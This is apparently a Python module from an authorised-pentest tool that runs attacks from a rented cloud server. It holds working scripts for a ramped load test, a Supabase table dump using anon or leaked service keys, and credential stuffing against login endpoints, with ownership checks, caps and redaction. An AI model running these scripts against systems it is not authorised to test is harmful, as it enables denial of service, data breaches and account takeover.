"""Cloud attack runners — heavy/scale attacks executed ON a Vultr box.

Each runner builds a self-contained command that runs on the remote box (so the
bandwidth/compute is the box's, not your laptop's), streams progress, and returns
Finding objects. Targets must be owned (the same guardrail gate applies before any
box is even provisioned).

The attacks here are the "more than Penny does locally" tier:
- load: distributed-style load / capacity test (ramp to the knee, then stop)
- supabase-dump: use a leaked anon/service key to pull rows RLS should block, at scale
- cred-stuffing / spray: login attacks with sizeable lists (volume needs a box)
- api-abuse: rate-limit + mass-enumeration probing at volume

Everything is bounded (request/time caps) and killable (the box process is tracked
so /kill can stop it). Nothing here is destructive to data; it proves impact at scale.
"""

from __future__ import annotations

import json
import shlex
from dataclasses import dataclass

from .feed import EventFeed
from .models import Finding, Location
from .redaction import redact_text
from . import vultr


# A small remote python script template that does a bounded load test from the box.
# Kept dependency-free (urllib) so the box needs no pip install.
_REMOTE_LOAD = r'''
import sys, time, urllib.request, concurrent.futures as cf
url = sys.argv[1]
max_conc = int(sys.argv[2]); max_reqs = int(sys.argv[3]); max_secs = float(sys.argv[4])
def one():
    t=time.time()
    try:
        urllib.request.urlopen(url, timeout=10).read(64)
        return time.time()-t, True
    except Exception:
        return time.time()-t, False
start=time.time(); sent=0; results=[]
for conc in [5,10,25,50,100,200]:
    if conc>max_conc or time.time()-start>=max_secs or sent>=max_reqs: break
    n=min(conc*5, max_reqs-sent)
    with cf.ThreadPoolExecutor(max_workers=conc) as ex:
        rs=list(ex.map(lambda _: one(), range(n)))
    sent+=n
    lat=sorted(r[0] for r in rs); ok=sum(1 for r in rs if r[1])
    p95=lat[int(len(lat)*0.95)-1] if lat else 0
    print(json._dumps({"concurrency":conc,"sent":n,"ok":ok,"p95":round(p95,3)}) if False else
          '{"concurrency":%d,"sent":%d,"ok":%d,"p95":%.3f}'%(conc,n,ok,p95), flush=True)
    if ok < n*0.8:  # knee: >20% failing -> stop, don't keep flooding
        print('{"knee":%d}'%conc, flush=True); break
print('{"done":true,"total":%d}'%sent, flush=True)
'''


@dataclass
class CloudResult:
    findings: list[Finding]
    raw: str


def _load_finding(target: str, evidence: dict) -> Finding:
    return Finding(
        title="Capacity limit reached under load (cloud)",
        severity="Medium",
        confidence="high",
        status="confirmed",
        source="dynamic",
        detector_id="C001",
        owasp=["A05:2021-Security Misconfiguration"],
        location=Location(file=f"cloud:{target}", line=1, column=1),
        snippet="Bounded cloud load test ramped concurrency until the target degraded.",
        evidence={"dynamic_probe": {"probe": "cloud_load_test", "status": "confirmed", **evidence}},
        impact="The service degrades or errors under achievable concurrency; an attacker or traffic spike can deny service.",
        remediation="Add rate limiting, autoscaling, caching/CDN, and load-shedding; set capacity alerts below the knee.",
    )


def run_cloud_load_test(
    ip: str,
    target: str,
    *,
    feed: EventFeed,
    max_concurrency: int = 200,
    max_requests: int = 5000,
    max_seconds: float = 30.0,
) -> CloudResult:
    """Run a bounded ramp-to-knee load test from the box. Read-only GETs only."""
    feed.emit("attack", f"[cloud] bounded load test on {target} from box {ip} (<= {max_concurrency} conc, {max_seconds:.0f}s)")
    # Push the remote script and run it.
    script_b64 = _b64(_REMOTE_LOAD)
    cmd = (
        f"echo {script_b64} | base64 -d > /tmp/penny_load.py && "
        f"python3 /tmp/penny_load.py {shlex.quote(target)} {max_concurrency} {max_requests} {max_seconds}"
    )
    code, out, err = vultr.ssh_run(ip, cmd, timeout=max_seconds + 60)
    stages, knee, total = [], None, 0
    for line in out.splitlines():
        line = line.strip()
        if not line.startswith("{"):
            continue
        try:
            obj = json.loads(line)
        except json.JSONDecodeError:
            continue
        if "knee" in obj:
            knee = obj["knee"]
            feed.emit("attack", f"[cloud] capacity knee at {knee} concurrent (>20% failures)")
        elif "done" in obj:
            total = obj.get("total", 0)
        else:
            stages.append(obj)
            feed.emit("attack", f"[cloud] conc={obj['concurrency']} ok={obj['ok']}/{obj['sent']} p95={obj['p95']}s")
    findings: list[Finding] = []
    if knee is not None:
        findings.append(_load_finding(target, {"knee_concurrency": knee, "stages": stages, "total_requests": total}))
    else:
        feed.emit("attack", f"[cloud] target held up across the ramp ({total} requests); no capacity knee found")
    return CloudResult(findings=findings, raw=redact_text(out + ("\n" + err if err else "")))


def _b64(text: str) -> str:
    import base64

    return base64.b64encode(text.encode("utf-8")).decode("ascii")


# ---------------------------------------------------------------------------
# Supabase mass-dump: prove RLS failure by actually pulling rows at scale.
# Reads only (GET /rest/v1/<table>?select=*). Stores only counts + a redacted
# sample shape — never the raw rows/PII — so it proves impact without becoming a
# data-exfil dump on disk.
# ---------------------------------------------------------------------------

_REMOTE_SUPABASE = r'''
import sys, json, urllib.request
base = sys.argv[1].rstrip("/")          # e.g. https://abc.supabase.co
apikey = sys.argv[2]                      # anon or leaked service key
tables = sys.argv[3].split(",")
def get(table):
    url = base + "/rest/v1/" + table + "?select=*&limit=1000"
    req = urllib.request.Request(url, headers={"apikey": apikey, "Authorization": "Bearer "+apikey})
    try:
        r = urllib.request.urlopen(req, timeout=15); body = r.read().decode("utf-8","replace")
        rows = json.loads(body) if body.strip().startswith("[") else []
        cols = sorted(rows[0].keys()) if rows and isinstance(rows[0], dict) else []
        return {"table": table, "status": r.status, "row_count": len(rows), "columns": cols[:20]}
    except urllib.error.HTTPError as e:
        return {"table": table, "status": e.code, "row_count": 0, "columns": []}
    except Exception as e:
        return {"table": table, "status": 0, "row_count": 0, "error": str(e)[:80]}
for t in tables:
    print(json.dumps(get(t)), flush=True)
'''

# Common Supabase table names to try when none are provided.
_DEFAULT_TABLES = "users,profiles,private_notes,orders,messages,posts,accounts,payments,sessions,api_keys"


def run_cloud_supabase_dump(
    ip: str,
    target: str,
    *,
    feed: EventFeed,
    apikey: str = "",
    tables: str = "",
    supabase_url: str = "",
) -> CloudResult:
    """Use a key to read rows RLS should block, across many tables, from the box."""
    base = supabase_url or target
    key = apikey or "anon"
    table_list = tables or _DEFAULT_TABLES
    feed.emit("attack", f"[cloud] Supabase mass-dump on {base} ({len(table_list.split(','))} tables) from box {ip}")
    cmd = (
        f"echo {_b64(_REMOTE_SUPABASE)} | base64 -d > /tmp/penny_sb.py && "
        f"python3 /tmp/penny_sb.py {shlex.quote(base)} {shlex.quote(key)} {shlex.quote(table_list)}"
    )
    code, out, err = vultr.ssh_run(ip, cmd, timeout=120)
    exposed = []
    for line in out.splitlines():
        line = line.strip()
        if not line.startswith("{"):
            continue
        try:
            obj = json.loads(line)
        except json.JSONDecodeError:
            continue
        if obj.get("status") == 200 and obj.get("row_count", 0) > 0:
            exposed.append(obj)
            feed.emit("attack", f"[cloud] EXPOSED: {obj['table']} -> {obj['row_count']} rows, cols={obj.get('columns')}")
    findings: list[Finding] = []
    if exposed:
        total = sum(e["row_count"] for e in exposed)
        findings.append(Finding(
            title="Supabase tables readable without authorization (mass-dump confirmed)",
            severity="Critical",
            confidence="high",
            status="confirmed",
            source="dynamic",
            detector_id="C002",
            owasp=["A01:2021-Broken Access Control"],
            location=Location(file=f"cloud:{base}", line=1, column=1),
            snippet=f"{len(exposed)} table(s), {total} rows pulled via the REST API with the supplied key.",
            evidence={"dynamic_probe": {
                "probe": "supabase_mass_dump", "status": "confirmed",
                "tables_exposed": [{"table": e["table"], "row_count": e["row_count"], "columns": e.get("columns", [])} for e in exposed],
                "total_rows": total,
                "stored_response": "table names, row counts, and column shape only — no raw rows/PII stored",
            }},
            impact="Anyone with this key can read entire tables the app intended to protect — a full data breach.",
            remediation="Enable RLS with owner-scoped policies on every table, and never ship a service-role key to clients.",
        ))
    else:
        feed.emit("attack", "[cloud] No tables returned rows with this key (RLS may be working, or wrong key/tables).")
    return CloudResult(findings=findings, raw=redact_text(out + ("\n" + err if err else "")))


# ---------------------------------------------------------------------------
# Credential stuffing / password spray at scale (login attacks). Read-result only:
# it sends login attempts and reads the status; it never creates/modifies accounts.
# ---------------------------------------------------------------------------

_REMOTE_CREDSTUFF = r'''
import sys, json, urllib.request, urllib.parse
url = sys.argv[1]; field_user = sys.argv[2]; field_pass = sys.argv[3]
pairs = [p.split(":",1) for p in sys.argv[4].split(",") if ":" in p]
hits = []
for u,p in pairs[:200]:
    data = json.dumps({field_user:u, field_pass:p}).encode()
    req = urllib.request.Request(url, data=data, headers={"Content-Type":"application/json"})
    try:
        r = urllib.request.urlopen(req, timeout=10); code = r.status
    except urllib.error.HTTPError as e:
        code = e.code
    except Exception:
        code = 0
    if code in (200,302):
        hits.append({"user":u,"status":code})
        print(json.dumps({"hit":u,"status":code}), flush=True)
print(json.dumps({"done":True,"tried":len(pairs[:200]),"hits":len(hits)}), flush=True)
'''


def run_cloud_cred_stuffing(
    ip: str,
    target: str,
    *,
    feed: EventFeed,
    login_url: str = "",
    user_field: str = "email",
    pass_field: str = "password",
    creds: str = "admin:admin,admin:password,test:test,root:root",
) -> CloudResult:
    """POST a credential list at a login endpoint, report which combos succeed."""
    url = login_url or (target.rstrip("/") + "/api/login")
    feed.emit("attack", f"[cloud] credential stuffing on {url} from box {ip} ({len(creds.split(','))} combos)")
    cmd = (
        f"echo {_b64(_REMOTE_CREDSTUFF)} | base64 -d > /tmp/penny_cred.py && "
        f"python3 /tmp/penny_cred.py {shlex.quote(url)} {shlex.quote(user_field)} {shlex.quote(pass_field)} {shlex.quote(creds)}"
    )
    code, out, err = vultr.ssh_run(ip, cmd, timeout=120)
    hits = []
    for line in out.splitlines():
        line = line.strip()
        if line.startswith("{") and '"hit"' in line:
            try:
                hits.append(json.loads(line)["hit"])
            except Exception:  # noqa: BLE001
                pass
    findings: list[Finding] = []
    if hits:
        findings.append(Finding(
            title="Weak/guessable credentials accepted (cloud cred-stuffing)",
            severity="Critical",
            confidence="high",
            status="confirmed",
            source="dynamic",
            detector_id="C003",
            owasp=["A07:2021-Identification and Authentication Failures"],
            location=Location(file=f"cloud:{url}", line=1, column=1),
            snippet=f"{len(hits)} credential pair(s) authenticated.",
            evidence={"dynamic_probe": {"probe": "cloud_cred_stuffing", "status": "confirmed",
                                        "accepted_users": hits, "stored_response": "usernames only; passwords redacted"}},
            impact="Default/weak credentials let attackers log in as real users.",
            remediation="Enforce strong passwords, rate-limit logins, add lockout + MFA.",
        ))
    else:
        feed.emit("attack", "[cloud] no weak credentials accepted.")
    return CloudResult(findings=findings, raw=redact_text(out + ("\n" + err if err else "")))


# Registry of cloud attack types -> runner.
CLOUD_ATTACKS = {
    "load": run_cloud_load_test,
    "supabase-dump": run_cloud_supabase_dump,
    "cred-stuffing": run_cloud_cred_stuffing,
}


def available_attacks() -> list[str]:
    return sorted(CLOUD_ATTACKS)
